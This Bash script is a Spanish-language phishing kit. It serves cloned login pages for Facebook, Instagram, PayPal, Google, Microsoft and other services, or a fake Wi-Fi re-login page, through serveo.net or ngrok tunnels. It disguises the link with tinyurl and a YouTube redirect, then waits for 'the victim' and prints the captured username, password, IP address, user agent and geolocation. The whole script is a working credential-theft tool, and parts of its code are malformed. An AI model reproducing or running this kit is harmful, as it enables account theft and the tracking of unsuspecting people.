
#!/bin/bash
trap 'printf "\n";stop;exit 1' 2

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}
			setterm -foreground magenta
menu() {
sleep 3
echo  "_[01]_ -Facebook-  [ ]      "                                   
echo  "_[02]_ -Instagram- [ ]            "  
echo  "_[04]_ -Twitter-   [ ]            "                
echo  "_[05]_  -Github-   [ ]            "               
echo  "_[06]- -Google-    [ ]            "
echo  "_[07]_ -Spotify-   [ ]            "
echo  "_[08]_ -Netflix-   [ ]           "      
echo  "_[09]_ -PayPal-    [ ]          "       
echo  "_[10]_  -Yahoo-    [ ]             "
echo  "_[11]_ -Linkedin-  [ ]            "
echo  "_[12]_ -Protonmail-[ ]            "     
echo  "_[13]_ -Wordpress- [ ]    "
echo  "_[14]_ -Microsoft- [ ]    "
		setterm -foreground cyan
echo  "--------------------------------------[Salir]--[¡99!]--[Salir]---------------------------"
echo  ""
echo  -e $"\n\e[1;92m[\e[0m\e[1;78m*\e[0m\e[1;92m]-_-_[Escoje Una Opcion_]- :"
echo -e "  ↱⤳--⤳Viaj3r0@05461[⇶--⬱  "
read -p "  ↳⟿-↭  "    option

if [[ $option == 1 || $option == 01 ]]; then
server="facebook"
start1

elif [[ $option == 2 || $option == 02 ]]; then
server="instagram"
start1

elif [[ $option == 4 || $option == 04 ]]; then
server="twitter"
start1

elif [[ $option == 5 || $option == 05 ]]; then
server="github"
start1

elif [[ $option == 6 || $option == 06 ]]; then
server="google"
start1

elif [[ $option == 7 || $option == 07 ]]; then
server="spotify"
start1

elif [[ $option == 8 || $option == 08 ]]; then
server="netflix"
start1

elif [[ $option == 9 || $option == 09 ]]; then
server="paypal"
start1

elif [[ $option == 10 ]]; then
server="yahoo"
start1

elif [[ $option == 11 ]]; then
server="linkedin"
start1

elif [[ $option == 12 ]]; then
server="protonmail"
start1

elif [[ $option == 13 ]]; then
server="wordpress"
start1

elif [[ $option == 14 ]]; then
server="microsoft"
start1

elif [[ $option == 99 ]]; then
exit 1

else
printf "\e[1;93m [!] -OPCIONN INCORRECT!\e[0m\n"
sleep 1
clear
banner
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}


				setterm -foreground magenta
banner() {
sleep 2
clear
echo -e "
												
			░██████╗██╗░░██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗  ██╗░░░░░██████╗░██╗░░██╗  
			██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║  ██║░░░░░██╔══██╗██║░██╔╝  
			╚█████╗░███████║███████║██║░░██║██║░░██║░╚██╗████╗██╔╝  ██║░░░░░██████╔╝█████═╝░  
			░╚═══██╗██╔══██║██╔══██║██║░░██║██║░░██║░░████╔═████║░  ██║░░░░░██╔═══╝░██╔═██╗░ 
			██████╔╝██║░░██║██║░░██║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░  ███████╗██║░░░░░██║░╚██╗  
 			╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░  ╚══════╝╚═╝░░░░░╚═╝░░╚═╝  
  			               ..... Shadow...-lpk-.....        Autor_: lpk      
"
setterm -foreground magenta

}


createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $' Title 1 Default: Wi-fi Session Expired: \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $' Title 2 Default: Please login again : \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $' Username field  Default: Username : \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $' Password field Default: Password: \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $' Submit field Default: Log-In: \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$"\n"
printf    '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf'<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf'<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf'<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf'<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf'<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf'</center>' >> sites/create/login.html
printf'<body>\n' >> sites/create/login.html
printf'</html>\n' >> sites/create/login.html


}


catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
setterm -foreground magenta
printf " [:]_°°Cuenta°°_[:] =\e[0m\e[1;77m %s\n\e[0m" $account
setterm -foreground red
printf " [:]_°°Contraseña°°_[:] = \e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
setterm -foreground yellow
printf "[:]_°°Guardado°°_[:] = \e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
exit 1

}
setterm -foreground blue
getcredentials() {
printf " [ [ * ] ] Esperando los datos de la victima ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m [ [ * ] ] Datos encontrados! \e[0m \n"
catch_cred

fi
sleep 1
done 


}
setterm -foreground yellow
catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
setterm -foreground blue
printf " [*]  IP de la Victima [_*_*] \e[0m " $ip
setterm -foreground blue
printf " [:]_°°USER-AGENT°°_[:] = \e[0m\e[1;77m %s\e[0m\n" $ua
setterm -foreground yellow
printf " [:]_°°Guardado°°_[:] = \e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
setterm -foreground red

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
setterm -foreground magenta
printf "\e [0;37m [:]_°°Hostname°°_[:] = \e[0m %s \n" $hostnameip
fi
##
setterm -foreground yellow
reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
setterm -foreground yellow
printf "[:]_°°Reverse DNS°°_[:] = \e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##
setterm -foreground magenta

if [[ $continent != "" ]]; then
setterm -foreground magenta
printf "[:]_°°IP del Continente°°_[:] = \e[0m\e[1;77m %s\e[0m\n" $continent
fi
##
setterm -foreground blue
country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
setterm -foreground blue
printf "[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##
setterm -foreground yellow
state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf " [:]_°°Estado°°_[:] = \e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
setterm -foreground red
if [[ $city != "" ]]; then
printf " [:]_°°Ubicacion de la Ciudad°°_[:] = \e[0m\e[1;77m %s\e[0m\n" $city
fi
##
setterm -foreground blue
isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "[-] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##
setterm -foreground magenta
as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "[-_-] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##
setterm -foreground yellow
ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "[/] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
setterm -foreground blue
if [[ $ip_currency != "" ]]; then
printf "[/] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}
##
		
serverx() {
printf "
		setterm -foreground blue
printf " [:]_°°_°°_[:] Iniciando servidor php..\e[0m "
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
setterm -foreground blue
printf " [:]_°°°°_[:] Starting servidor...\e[0m\n"
		setterm -foreground magenta
 Iniciando servidor php...\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "[:]_°°°°_[:] Starting servidor...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "requiere de  SSH pero no esta instalado. Instalalo. abortando.."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10 # &
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
setterm -foreground yellow
printf ' [:]_°°<<>>°°_[:] Envie el link a la victima:\e[0m\e[1;77m %s \e[0m \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf ' _ [:]_°°Acortador°°_[:]  Tinyurl :\e[0m\e[1;77m %s \e[0m \n' $send_ip
printf "\n"
checkfound


}

startx() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi
		setterm -foreground red
default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '[:]_°° :0 °°_[:] Elije Un Puerto: (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
serverx

}


##

start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

		setterm -foreground yellow
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 " requiere de unzip pero no esta instalado. Instalalo. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "requiere de  wget pero no esta instalado . Instalalo . Aborting."; exit 1; }
printf "\e 0;33m [:]_°° :D °°_[:] Instalando Ngrok...\e[0m \n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf " [!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
setterm -foreground red
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
		setterm -foreground yellow
printf " [:]_°° :s °°_[:] Iniciando servidor php...\e[0m \n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
setterm -foreground red
printf "  [:]_°° =) °°_[:] Iniciando servidor ngrok...\e[0m \n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
			
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;96m[\e[0m*\e[1;93m] Envia este enlace al destino.:\e[0m\e[1;77m %s\e[0m\n" $link
send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
setterm -foreground magenta
printf '>><< _ [:]_°°Acortador°°_[:] tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
		setterm -foreground blue
printf "\n"
printf "\e[0;31m  [:]_°°01°°_[:] Serveo.net (SSH Tunelling, Best!)\e[0m\n"
printf "\e[0;31m  [:]_°°02°°_[:] Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n \e[1;34m _[:]_°°-*-°°_[:] Elije un tunnel: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
start

else
printf "\e[1;93m [!] Invalida option!\e[0m\n"
sleep 1
clear
start1
fi

}
checkfound() {
			setterm -foreground cyan
printf "\n"
printf " [:]_°° :-¡ °°_[:] Esperando que la victima habra el enlace ...\e[0m\n"
while [ true ]; do

setterm -foreground cyan
if [[ -e "sites/$server/ip.txt" ]]; then
setterm -foreground cyan
printf " _<>_ IP Encontrada! \e[0m \n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n ! Credentials Found ! \e[0m \n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5
done 

}
banner
dependencies
menu
























































░██████╗██╗░░██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗  ██╗░░░░░██████╗░██╗░░██╗
██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║  ██║░░░░░██╔══██╗██║░██╔╝
╚█████╗░███████║███████║██║░░██║██║░░██║░╚██╗████╗██╔╝  ██║░░░░░██████╔╝█████═╝░
░╚═══██╗██╔══██║██╔══██║██║░░██║██║░░██║░░████╔═████║░  ██║░░░░░██╔═══╝░██╔═██╗░
██████╔╝██║░░██║██║░░██║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░  ███████╗██║░░░░░██║░╚██╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░  ╚══════╝╚═╝░░░░░╚═╝░░╚═╝
